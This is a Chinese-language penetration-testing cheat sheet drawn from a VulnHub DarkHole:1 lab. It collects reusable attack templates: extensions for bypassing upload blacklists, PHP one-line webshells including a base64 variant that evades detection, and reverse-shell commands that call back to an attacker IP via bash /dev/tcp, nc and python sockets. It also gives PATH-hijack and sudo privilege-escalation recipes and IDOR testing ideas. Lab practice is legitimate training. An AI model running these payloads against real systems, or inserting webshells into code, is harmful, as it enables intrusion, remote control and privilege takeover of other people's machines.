# payload 与技巧提炼（DarkHole:1 沉淀）

> 本笔记把 DarkHole:1 中用到、且可跨靶机复用的 payload 模板与思路整理成清单。来源：[[vuln-lab/VulnHub/DarkHole-1/DarkHole-1-通关writeup|DarkHole-1 通关笔记]]。
> 使用原则：先理解每条 payload 的适用条件，再复制；失效时先排查"条件不满足"，而非盲目换 payload。

---

## 1. 文件上传黑名单绕过扩展名清单

适用场景：上传点有后缀黑名单（.php/.asp 等被拦截），但服务器对文件后缀的解析不止一种。

| 扩展名 | 适用解析器 | 说明 |
|--------|-----------|------|
| .php | Apache/PHP | 最常规，通常被拦 |
| .phtml | Apache（AddHandler） | 常被黑名单遗漏，DarkHole 用此绕过 |
| .php3/.php4/.php5/.php7 | 老版本 PHP 配置 | 历史配置可能仍解析 |
| .pht | Apache | 有时在解析列表中 |
| .phar | PHP | 以 PHP 语法解析 |
| .htaccess | Apache | 上传后写入，重新定义目录解析规则（需 AllowOverride 生效） |
| .Php/.PHp（大小写） | 大小写不敏感服务器 | 若黑名单做了大小写敏感匹配则可绕过 |
| .php.jpg（双扩展名） | Apache 从右往左解析 | 若最终识别为 jpg 则不执行，需服务端解析顺序配合 |

常用探测命令：逐个上传测试，访问对应 URL 确认是否被当作 PHP 执行（如访问 `shell.phtml` 看能否解析 `<?php` 内容）。

## 2. 一句话木马与工具连接

```php
<?php @eval($_POST['cmd']); ?>          // 经典 eval 一句话
<?php system($_POST['cmd']); ?>         // 直接执行系统命令
<?php @assert($_POST['cmd']); ?>        // assert 版本（部分旧配置可用）
```

工具连接要点（蚁剑 AntSword / 菜刀 Caidao）：
- URL 填完整的木马地址：`http://目标/upload/shell.phtml`
- 连接密码填 POST 参数名（上面例子都是 `cmd`）
- 先"测试连接"，成功后再进入文件管理/虚拟终端

混淆变体思路（用于内容检测绕过）：
```php
<?php @eval(base64_decode($_POST['cmd'])); ?>
```
配合 `echo base64_encode('system("id");')` 生成 payload，可绕过简单字符串匹配检测。

## 3. 反弹 shell 速查

前提：目标机上存在对应工具（bash/nc/python）。攻击机先监听：`nc -lvnp <PORT>`。

| 方式 | 命令 | 适用/注意 |
|------|------|-----------|
| bash | `bash -c 'bash -i >& /dev/tcp/<攻击机IP>/<PORT> 0>&1'` | 目标有 bash 即可，最常用 |
| nc（-e） | `nc <攻击机IP> <PORT> -e /bin/bash` | 目标 nc 带 -e 参数（新版常无） |
| nc（mkfifo） | `mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <攻击机IP> <PORT> > /tmp/f` | nc 无 -e 时的替代 |
| python | `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<攻击机IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` | 目标有 python3 时可靠 |

交互 shell 升级（提权前必做，获得完整终端能力）：
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 再按 Ctrl+Z，本地执行 stty raw -echo; fg 可得到完整交互式 shell
```

## 4. PATH 环境变量劫持提权模板

适用条件（缺一不可）：
- 存在以更高权限运行的程序（SUID 位或 setuid）且内部调用外部命令
- 被调用的命令使用**相对路径**（如 `id`，而非 `/usr/bin/id`）
- 你能控制 PATH 环境变量

```bash
# 1. 确认目标程序调用了什么外部命令
strings /path/to/toto | grep -E 'system|exec|/bin/'
# 或直接运行观察输出

# 2. 在可控目录伪造同名命令
cd /tmp
echo "/bin/bash" > id          # id 为程序调用的命令名
chmod 777 id

# 3. 把可控目录放到 PATH 最前
export PATH=/tmp:$PATH

# 4. 触发特权程序
/path/to/toto
# 得到高权限 shell（即特权程序运行身份）
```

失败排查清单：
- 程序用绝对路径调用命令（劫持无效）
- 程序内部重置了 PATH（查看源代码/strings 确认）
- 目标程序以 root 运行但 root 环境被限制（sudo 环境变量清理）

## 5. sudo 提权审计

提权第一步永远是看自己有哪些 sudo 权限：
```bash
sudo -l
```

常见可提权配置与利用：

| sudoers 条目（示意） | 利用方法 |
|----------------------|----------|
| `NOPASSWD: /usr/bin/python3 /home/user/x.py` | 覆写 x.py：`echo 'import os;os.system("/bin/bash")' > x.py`，再 sudo 执行 |
| `NOPASSWD: /usr/bin/python3` | 直接 `sudo python3 -c 'import os;os.system("/bin/bash")'` |
| `NOPASSWD: /bin/sh` | 直接 `sudo /bin/sh` |
| `NOPASSWD: /usr/bin/find` | `sudo find / -exec /bin/sh \;`（经典姿势） |
| 其他命令 | 查 GTFOBins（https://gtfobins.github.io/）按命令名搜索提权姿势 |

判断要点：允许的"命令"如果本身可被普通用户修改（脚本、可写目录中的文件），等于以 root 执行任意代码。

## 6. IDOR / 身份参数篡改思路

发现手法：
- 登录后注意 URL、请求体、cookie 中的身份参数：`id`、`uid`、`user_id`、`account` 等
- 修改参数值观察响应差异（1、2、3...递增尝试）
- 重点测试"修改密码 / 修改资料 / 查看详情 / 拉取列表"这类带业务动作的接口——不同接口的鉴权强度常常不一致

检测点（哪些接口容易漏）：
- 修改/重置密码：是否校验 session 身份与请求参数一致
- 查询接口：是否按参数直接返回他人数据而不校验属主
- 批量接口：是否可遍历获取全量数据

修复原则：
- 服务端一律以 session 中的身份为准，忽略客户端提交的身份参数
- 所有资源访问都做属主校验（访问控制检查），而非只在部分接口做
- 对应编号：CWE-639（通过用户控制的键访问资源）
